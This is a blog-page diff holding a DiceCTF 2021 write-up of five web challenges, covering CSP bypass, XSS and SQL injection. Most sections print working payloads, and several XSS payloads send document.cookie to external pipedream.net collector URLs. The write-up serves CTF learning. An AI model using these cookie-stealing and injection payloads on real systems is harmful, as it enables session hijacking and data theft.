@@ -1,0 +1,551 @@
+<!DOCTYPE html>
+<html lang="en" color-mode="light">
+
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="keywords" content="" />
+  <meta name="author" content="Jeongwon Jo" />
+  <meta name="description" content="" />
+  
+  
+  <title>
+    
+      Dice CTF 2021 Write Up 
+      
+      
+      |
+    
+     Jeongwon Jo
+  </title>
+
+  
+    <link rel="apple-touch-icon" href="/images/favicon.png">
+    <link rel="icon" href="/images/favicon.png">
+  
+
+  <!-- Raleway-Font -->
+  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">
+
+  <!-- hexo site css -->
+  <link rel="stylesheet" href="/css/main.css" />
+  <link rel="stylesheet" href="//at.alicdn.com/t/font_1886449_67xjft27j1l.css" />
+  <!-- 代码块风格 -->
+  
+    
+<link rel="stylesheet" href="/css/figcaption/mac-block.css">
+
+  
+
+  <!-- jquery3.3.1 -->
+  
+    <script defer type="text/javascript" src="/plugins/jquery.min.js"></script>
+  
+
+  <!-- fancybox -->
+  
+    <link href="/plugins/jquery.fancybox.min.css" rel="stylesheet">
+    <script defer type="text/javascript" src="/plugins/jquery.fancybox.min.js"></script>
+  
+  
+<script src="/js/fancybox.js"></script>
+
+
+  
+
+  
+
+  <script>
+    var html = document.documentElement
+    const colorMode = localStorage.getItem('color-mode')
+    if (colorMode) {
+      document.documentElement.setAttribute('color-mode', colorMode)
+    }
+  </script>
+<meta name="generator" content="Hexo 7.0.0"></head>
+
+
+  <body>
+    <div id="app">
+      <div class="header">
+  <div class="avatar">
+    <a href="/">
+      <!-- 头像取消懒加载，添加no-lazy -->
+      
+        <img src="/images/avatar.png" alt="">
+      
+    </a>
+    <div class="nickname"><a href="/">Pocas</a></div>
+  </div>
+  <div class="navbar">
+    <ul>
+      
+        <li class="nav-item" data-path="/">
+          <a href="/">Home</a>
+        </li>
+      
+        <li class="nav-item" data-path="/archives/">
+          <a href="/archives/">Archives</a>
+        </li>
+      
+        <li class="nav-item" data-path="https://pocas.kr">
+          <a target="_blank" rel="noopener" href="https://pocas.kr">About</a>
+        </li>
+      
+    </ul>
+  </div>
+</div>
+
+
+<script src="/js/activeNav.js"></script>
+
+
+
+      <div class="flex-container">
+        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
+<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->
+
+
+  <!-- LaTex Display -->
+
+  
+    <script async type="text/javascript" src="/plugins/mathjax/tex-chtml.js"></script>
+  
+  <script>
+    MathJax = {
+      tex: {
+        inlineMath: [['$', '$'], ['\\(', '\\)']]
+      }
+    }
+  </script>
+
+
+
+
+
+  <!-- clipboard -->
+
+  
+    <script async type="text/javascript" src="/plugins/clipboard.min.js"></script>
+  
+  
+<script src="/js/codeCopy.js"></script>
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
+  <div class="container post-details" id="post-details">
+    <div class="post-content">
+      <div class="post-title">Dice CTF 2021 Write Up</div>
+      <div class="post-attach">
+        <span class="post-pubtime">
+          <i class="iconfont icon-updatetime mr-10" title="Update time"></i>
+          2021-02-08 23:29:53
+        </span>
+        
+      </div>
+      <div class="markdown-body">
+        <p><img src="https://github.com/wjddnjs33/image/blob/main/Dice%20CTF/dice%20main.png?raw=true"></p>
+<hr>
+<h3 id="Web-Babier-CSP-107-pts"><a href="#Web-Babier-CSP-107-pts" class="headerlink" title="(Web) Babier CSP [107 pts]"></a>(Web) Babier CSP [107 pts]</h3><p>The Babier CSP challenge is a simple CSP Bypass challenge.</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">nonce</span>=<span class="string">LRGWAXOY98Es0zz0QOVmag</span>==&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">elem.<span class="property">onclick</span> = <span class="function">() =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">  location = <span class="string">&quot;/?name=&quot;</span> + <span class="built_in">encodeURIComponent</span>([<span class="string">&quot;apple&quot;</span>, <span class="string">&quot;orange&quot;</span>, <span class="string">&quot;pineapple&quot;</span>, <span class="string">&quot;pear&quot;</span>][<span class="title class_">Math</span>.<span class="title function_">floor</span>(<span class="number">4</span> * <span class="title class_">Math</span>.<span class="title function_">random</span>())]);</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>If you check the source code, you can see that the nonce value of the script tag is set as above. I thought that the admin bot was also applying the nonce value as above.</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">nonce</span>=<span class="string">LRGWAXOY98Es0zz0QOVmag</span>==&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">nonce</span>=<span class="string">LRGWAXOY98Es0zz0QOVmag</span>==&gt;</span><span class="language-javascript">location.<span class="property">href</span>=<span class="string">&quot;https://79a9bb50560aa2c77156e03b431dc2b3.m.pipedream.net&quot;</span>%2bdocument.<span class="property">cookie</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>The payload used is as above.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FLAG : dice&#123;web_1s_a_stat3_0f_grac3_857720&#125;</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="Web-Missing-Flavortext-111-pts"><a href="#Web-Missing-Flavortext-111-pts" class="headerlink" title="(Web) Missing Flavortext [111 pts]"></a>(Web) Missing Flavortext [111 pts]</h3><p>The Missing Flavortext challenge is a SQL Injection challenge that bypasses single quotas by using the features of express.js.</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ([req.<span class="property">body</span>.<span class="property">username</span>, req.<span class="property">body</span>.<span class="property">password</span>].<span class="title function_">some</span>(<span class="function"><span class="params">v</span> =&gt;</span> v.<span class="title function_">includes</span>(<span class="string">&#x27;\&#x27;&#x27;</span>))) &#123;</span><br><span class="line">  <span class="keyword">return</span> res.<span class="title function_">redirect</span>(<span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>In the code above, single quota is filtered using the includes function. However, this can be bypassed by passing it as an array because it only verifies strings.</p>
+<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username=admin&amp;password[]=1&amp;password[]=&#x27; or &#x27;1&#x27;=&#x27;1</span><br><span class="line">The payload used is as above.</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FLAG : dice&#123;sq1i_d03sn7_3v3n_3x1s7_4nym0r3&#125;</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="Web-Web-Utils-121-pts"><a href="#Web-Web-Utils-121-pts" class="headerlink" title="(Web) Web Utils [121 pts]"></a>(Web) Web Utils [121 pts]</h3><p>The Web Utils challenge is a challenge that triggers XSS using a vulnerability when receiving the req.body value.</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">// view.html</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span> <span class="attr">async</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    (<span class="keyword">async</span> () =&gt; &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">const</span> id = <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">pathname</span>.<span class="title function_">split</span>(<span class="string">&#x27;/&#x27;</span>)[<span class="number">2</span>];</span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">if</span> (! id) <span class="variable language_">window</span>.<span class="property">location</span> = <span class="variable language_">window</span>.<span class="property">origin</span>;</span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">const</span> res = <span class="keyword">await</span> <span class="title function_">fetch</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">window</span>.origin&#125;</span>/api/data/<span class="subst">$&#123;id&#125;</span>`</span>);</span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">const</span> &#123; data, type &#125; = <span class="keyword">await</span> res.<span class="title function_">json</span>();</span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">if</span> (! data || ! type ) <span class="variable language_">window</span>.<span class="property">location</span> = <span class="variable language_">window</span>.<span class="property">origin</span>;</span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">if</span> (type === <span class="string">&#x27;link&#x27;</span>) <span class="keyword">return</span> <span class="variable language_">window</span>.<span class="property">location</span> = data;</span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">if</span> (<span class="variable language_">document</span>.<span class="property">readyState</span> !== <span class="string">&quot;complete&quot;</span>)</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">await</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">r</span>) =&gt;</span> &#123; <span class="variable language_">window</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;load&#x27;</span>, r); &#125;);</span></span><br><span class="line"><span class="language-javascript">      <span class="variable language_">document</span>.<span class="property">title</span> = <span class="string">&#x27;Paste&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">      <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;div&#x27;</span>).<span class="property">textContent</span> = data;</span></span><br><span class="line"><span class="language-javascript">    &#125;)()</span></span><br><span class="line"><span class="language-javascript">  </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>It is view.html code, and if the type is link in the middle, you can see window.location as data. And if data contains a payload such as javascript:alert(1), you can trigger xss.</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// api.js</span></span><br><span class="line">(skip)</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = <span class="keyword">async</span> (fastify) =&gt; &#123;</span><br><span class="line">  fastify.<span class="title function_">post</span>(<span class="string">&#x27;createLink&#x27;</span>, &#123;</span><br><span class="line">    <span class="attr">handler</span>: <span class="function">(<span class="params">req, rep</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">const</span> uid = database.<span class="title function_">generateUid</span>(<span class="number">8</span>);</span><br><span class="line">      <span class="keyword">const</span> regex = <span class="keyword">new</span> <span class="title class_">RegExp</span>(<span class="string">&#x27;^https?://&#x27;</span>);</span><br><span class="line">      <span class="keyword">if</span> (! regex.<span class="title function_">test</span>(req.<span class="property">body</span>.<span class="property">data</span>))</span><br><span class="line">        <span class="keyword">return</span> rep</span><br><span class="line">        </span><br><span class="line">(skip)</span><br></pre></td></tr></table></figure>
+<p>However, if you look at the link creation logic, the value of req.body.data is verified with a regular expression. So, you can’t put xss payload in the link creation logic.</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// api.js</span></span><br><span class="line">(skip)</span><br><span class="line"></span><br><span class="line">fastify.<span class="title function_">post</span>(<span class="string">&#x27;createPaste&#x27;</span>, &#123;</span><br><span class="line">    <span class="attr">handler</span>: <span class="function">(<span class="params">req, rep</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">const</span> uid = database.<span class="title function_">generateUid</span>(<span class="number">8</span>);</span><br><span class="line">      database.<span class="title function_">addData</span>(&#123; <span class="attr">type</span>: <span class="string">&#x27;paste&#x27;</span>, ...req.<span class="property">body</span>, uid &#125;);</span><br><span class="line">      rep</span><br><span class="line">        .<span class="title function_">code</span>(<span class="number">200</span>)</span><br><span class="line"></span><br><span class="line">(skip)</span><br></pre></td></tr></table></figure>
+<p>However, if you look at the logic that creates the Pate, there is no verification for req.body, which causes a vulnerability here. Using this, you can give type as link and data as xss payload.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;data&quot;:&quot;javascript:alert(1)&quot;,&quot;type&quot;:&quot;link&quot;&#125;</span><br><span class="line">&#123;&quot;data&quot;:&quot;javascript:location.href=&#x27;https://79a9bb50560aa2c77156e03b431dc2b3.m.pipedream.net/&#x27;%2bdocument.cookie&quot;,&quot;type&quot;:&quot;link&quot;&#125;</span><br></pre></td></tr></table></figure>
+<p>The payload used is as above.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FLAG : dice&#123;f1r5t_u53ful_j4v45cr1pt_r3d1r3ct&#125;</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="Web-Build-a-Panel-130-pts"><a href="#Web-Build-a-Panel-130-pts" class="headerlink" title="(Web) Build a Panel [130 pts]"></a>(Web) Build a Panel [130 pts]</h3><p>The Build a Panel challenge is the challenge of reading flags using SQL Injection in the insert statement.</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/admin/debug/add_widget&#x27;</span>, <span class="keyword">async</span> (req, res) =&gt; &#123;</span><br><span class="line">    <span class="keyword">const</span> cookies = req.<span class="property">cookies</span>;</span><br><span class="line">    <span class="keyword">const</span> queryParams = req.<span class="property">query</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(cookies[<span class="string">&#x27;token&#x27;</span>] &amp;&amp; cookies[<span class="string">&#x27;token&#x27;</span>] == secret_token)&#123;</span><br><span class="line">        query = <span class="string">`INSERT INTO widgets (panelid, widgetname, widgetdata) VALUES (&#x27;<span class="subst">$&#123;queryParams[<span class="string">&#x27;panelid&#x27;</span>]&#125;</span>&#x27;, &#x27;<span class="subst">$&#123;queryParams[<span class="string">&#x27;widgetname&#x27;</span>]&#125;</span>&#x27;, &#x27;<span class="subst">$&#123;queryParams[<span class="string">&#x27;widgetdata&#x27;</span>]&#125;</span>&#x27;);`</span>;</span><br><span class="line">        db.<span class="title function_">run</span>(query, <span class="function">(<span class="params">err</span>) =&gt;</span> &#123;</span><br><span class="line">            <span class="keyword">if</span>(err)&#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(err);</span><br><span class="line">                res.<span class="title function_">send</span>(<span class="string">&#x27;something went wrong&#x27;</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                res.<span class="title function_">send</span>(<span class="string">&#x27;success!&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        res.<span class="title function_">redirect</span>(<span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+<p>This is the logic of add_widget running on admin bot. When looking at the query, the input value is entered without any verification, so SQL Injection can be performed.</p>
+<p>If we put our panelid in panelid and a query that reads flag in widgetname, a widget is created on our server, and the widget name contains FLAG. (panelid is stored in a cookie.</p>
+<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://build-a-panel.dicec.tf/admin/debug/add_widget?panelid=pocas&amp;widgetname=adfdaf&amp;widgetdata=a&#x27;), (&#x27;pocas&#x27;, (select flag from flag), &#x27;&#123;&quot;type&quot;:&quot;pocas&quot;&#125;&#x27;)--</span><br></pre></td></tr></table></figure>
+<p>The payload used is as above.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FLAG : dice&#123;ch41n_ChAIn_aNd_m0Re_cHaIn&#125;</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="Web-Web-IDE-196-pts"><a href="#Web-Web-IDE-196-pts" class="headerlink" title="(Web) Web IDE [196 pts]"></a>(Web) Web IDE [196 pts]</h3><p>The Web IDE challenge is a challenge that bypasses iframe sandbox and triggers XSS.</p>
+<ul>
+<li>Scenario<ul>
+<li>We are using allow-scripts as an option for iframe, and the value we input is executed by the eval function in sandbox.html.</li>
+<li>The path to the administrator’s cookie is &#x2F;ide, so it is not easy to read the cookie. Because xss payload runs in &#x2F;sandbox.html.</li>
+<li>So, first you need to create a separate site and bypass the iframe sandbox.</li>
+<li>If you bypass the iframe sandbox, you are not limited by sop, and you can freely execute xss payloads.</li>
+<li>However, since xss payload is executed in &#x2F;sandbox.html, it cannot read the admin cookie.</li>
+<li>So, create an object using window.open(“&#x2F;ide”), and execute xss payload on the object to steal the cookie.</li>
+</ul>
+</li>
+</ul>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!doctype <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>xss poc<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">sendMessage</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="comment">// window open -&gt; make file -&gt; include it</span></span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">const</span> cmd=<span class="string">&quot;[].constructor.constructor(\&quot;(async () =&gt; &#123;const res = await fetch(&#x27;https://web-ide.dicec.tf/ide/save&#x27;, &#123;method:&#x27;POST&#x27;, headers: &#123;&#x27;Content-Type&#x27;: &#x27;application/javascript&#x27;&#125;, body: &#x27;const myWindow = window.open(\\\&quot;/ide\\\&quot;); (async (myWindow) =&gt; &#123; await setTimeout( async() =&gt; &#123;await fetch(`https://en20uuq0p0wxmkp.m.pipedream.net/?flag=$&#123;myWindow.document.cookie&#125;`)&#125;, 500) &#125;)(myWindow)&#x27;&#125;); const file_name = await res.text(); const scr = document.createElement(&#x27;script&#x27;); scr.src = `/ide/saves/$&#123;file_name&#125;`; document.body.appendChild(scr);&#125;)()\&quot;)()&quot;</span></span></span><br><span class="line"><span class="language-javascript">            </span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">await</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">r</span>) =&gt;</span> &#123; <span class="variable language_">window</span>.<span class="title function_">addEventListener</span>((<span class="string">&#x27;load&#x27;</span>), r); &#125;);</span></span><br><span class="line"><span class="language-javascript">            <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;iframe&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">              .<span class="property">contentWindow</span></span></span><br><span class="line"><span class="language-javascript">              .<span class="title function_">postMessage</span>(cmd, <span class="string">&#x27;*&#x27;</span>);  <span class="comment">// IDE -&gt; sandbox message</span></span></span><br><span class="line"><span class="language-javascript">        &#125;;</span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&#x27;x&#x27;</span> <span class="attr">onerror</span>=<span class="string">&quot;sendMessage()&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">iframe</span> <span class="attr">name</span>=<span class="string">&#x27;hh&#x27;</span> <span class="attr">src</span>=<span class="string">&quot;https://web-ide.dicec.tf/sandbox.html&quot;</span> <span class="attr">frameborder</span>=<span class="string">&quot;0&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>The payload used is as above.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FLAG :dice&#123;c0uldn7_f1nd_4_b4ckr0nym_f0r_1de&#125;</span><br></pre></td></tr></table></figure>
+
+      </div>
+      
+        <div class="prev-or-next">
+          <div class="post-foot-next">
+            
+          </div>
+          <div class="post-attach">
+            <span class="post-pubtime">
+              <i class="iconfont icon-updatetime mr-10" title="Update time"></i>
+              2021-02-08 23:29:53
+            </span>
+            
+          </div>
+          <div class="post-foot-prev">
+            
+              <a href="/2021/02/28/2021-02-28-Trust-CTF/" target="_self">
+                <span>Next</span>
+                <i class="iconfont icon-chevronright"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+    </div>
+    
+  <div id="btn-catalog" class="btn-catalog">
+    <i class="iconfont icon-catalog"></i>
+  </div>
+  <div class="post-catalog hidden" id="catalog">
+    <div class="title">Contents</div>
+    <div class="catalog-content">
+      
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#Web-Babier-CSP-107-pts"><span class="toc-text">(Web) Babier CSP [107 pts]</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Web-Missing-Flavortext-111-pts"><span class="toc-text">(Web) Missing Flavortext [111 pts]</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Web-Web-Utils-121-pts"><span class="toc-text">(Web) Web Utils [121 pts]</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Web-Build-a-Panel-130-pts"><span class="toc-text">(Web) Build a Panel [130 pts]</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Web-Web-IDE-196-pts"><span class="toc-text">(Web) Web IDE [196 pts]</span></a></li></ol>
+      
+    </div>
+  </div>
+
+  
+<script src="/js/catalog.js"></script>
+
+
+
+
+    
+      <div class="comments-container">
+        
+
+
+
+
+
+
+
+      </div>
+    
+  </div>
+
+
+        
+<div class="footer">
+  <div class="social">
+    <ul>
+      
+        <li>
+          <a title="github" target="_blank" rel="noopener" href="https://github.com/P0cas">
+            <i class="iconfont icon-github"></i>
+          </a>
+        </li>
+      
+    </ul>
+  </div>
+  
+    
+    <div class="footer-more">
+      
+        Copyright © 2023 Pocas
+        
+    </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Powered by Hexo</a>
+        
+    </div>
+  
+  
+</div>
+
+      </div>
+
+      <div class="tools-bar">
+        <div class="back-to-top tools-bar-item hidden">
+  <a href="javascript: void(0)">
+    <i class="iconfont icon-chevronup"></i>
+  </a>
+</div>
+
+
+<script src="/js/backtotop.js"></script>
+
+
+
+        
+  <div class="search-icon tools-bar-item" id="search-icon">
+    <a href="javascript: void(0)">
+      <i class="iconfont icon-search"></i>
+    </a>
+  </div>
+
+  <div class="search-overlay hidden">
+    <div class="search-content" tabindex="0">
+      <div class="search-title">
+        <span class="search-icon-input">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-search"></i>
+          </a>
+        </span>
+        
+          <input type="text" class="search-input" id="search-input" placeholder="Search...">
+        
+        <span class="search-close-icon" id="search-close-icon">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-close"></i>
+          </a>
+        </span>
+      </div>
+      <div class="search-result" id="search-result"></div>
+    </div>
+  </div>
+
+  <script type="text/javascript">
+    var inputArea = document.querySelector("#search-input")
+    var searchOverlayArea = document.querySelector(".search-overlay")
+
+    inputArea.onclick = function() {
+      getSearchFile()
+      this.onclick = null
+    }
+
+    inputArea.onkeydown = function() {
+      if(event.keyCode == 13)
+        return false
+    }
+
+    function openOrHideSearchContent() {
+      let isHidden = searchOverlayArea.classList.contains('hidden')
+      if (isHidden) {
+        searchOverlayArea.classList.remove('hidden')
+        document.body.classList.add('hidden')
+        // inputArea.focus()
+      } else {
+        searchOverlayArea.classList.add('hidden')
+        document.body.classList.remove('hidden')
+      }
+    }
+
+    function blurSearchContent(e) {
+      if (e.target === searchOverlayArea) {
+        openOrHideSearchContent()
+      }
+    }
+
+    document.querySelector("#search-icon").addEventListener("click", openOrHideSearchContent, false)
+    document.querySelector("#search-close-icon").addEventListener("click", openOrHideSearchContent, false)
+    searchOverlayArea.addEventListener("click", blurSearchContent, false)
+
+    var searchFunc = function (path, search_id, content_id) {
+      'use strict';
+      var $input = document.getElementById(search_id);
+      var $resultContent = document.getElementById(content_id);
+      $resultContent.innerHTML = "<ul><span class='local-search-empty'>First search, index file loading, please wait...<span></ul>";
+      $.ajax({
+        // 0x01. load xml file
+        url: path,
+        dataType: "xml",
+        success: function (xmlResponse) {
+          // 0x02. parse xml file
+          var datas = $("entry", xmlResponse).map(function () {
+            return {
+              title: $("title", this).text(),
+              content: $("content", this).text(),
+              url: $("url", this).text()
+            };
+          }).get();
+          $resultContent.innerHTML = "";
+
+          $input.addEventListener('input', function () {
+            // 0x03. parse query to keywords list
+            var str = '<ul class=\"search-result-list\">';
+            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+            $resultContent.innerHTML = "";
+            if (this.value.trim().length <= 0) {
+              return;
+            }
+            // 0x04. perform local searching
+            datas.forEach(function (data) {
+              var isMatch = true;
+              var content_index = [];
+              if (!data.title || data.title.trim() === '') {
+                data.title = "Untitled";
+              }
+              var orig_data_title = data.title.trim();
+              var data_title = orig_data_title.toLowerCase();
+              var orig_data_content = data.content.trim().replace(/<[^>]+>/g, "");
+              var data_content = orig_data_content.toLowerCase();
+              var data_url = data.url;
+              var index_title = -1;
+              var index_content = -1;
+              var first_occur = -1;
+              // only match artiles with not empty contents
+              if (data_content !== '') {
+                keywords.forEach(function (keyword, i) {
+                  index_title = data_title.indexOf(keyword);
+                  index_content = data_content.indexOf(keyword);
+
+                  if (index_title < 0 && index_content < 0) {
+                    isMatch = false;
+                  } else {
+                    if (index_content < 0) {
+                      index_content = 0;
+                    }
+                    if (i == 0) {
+                      first_occur = index_content;
+                    }
+                    // content_index.push({index_content:index_content, keyword_len:keyword_len});
+                  }
+                });
+              } else {
+                isMatch = false;
+              }
+              // 0x05. show search results
+              if (isMatch) {
+                str += "<li><a href='" + data_url + "' class='search-result-title'>" + orig_data_title + "</a>";
+                var content = orig_data_content;
+                if (first_occur >= 0) {
+                  // cut out 100 characters
+                  var start = first_occur - 20;
+                  var end = first_occur + 80;
+
+                  if (start < 0) {
+                    start = 0;
+                  }
+
+                  if (start == 0) {
+                    end = 100;
+                  }
+
+                  if (end > content.length) {
+                    end = content.length;
+                  }
+
+                  var match_content = content.substr(start, end);
+
+                  // highlight all keywords
+                  keywords.forEach(function (keyword) {
+                    var regS = new RegExp(keyword, "gi");
+                    match_content = match_content.replace(regS, "<span class=\"search-keyword\">" + keyword + "</span>");
+                  });
+
+                  str += "<p class=\"search-result-abstract\">" + match_content + "...</p>"
+                }
+                str += "</li>";
+              }
+            });
+            str += "</ul>";
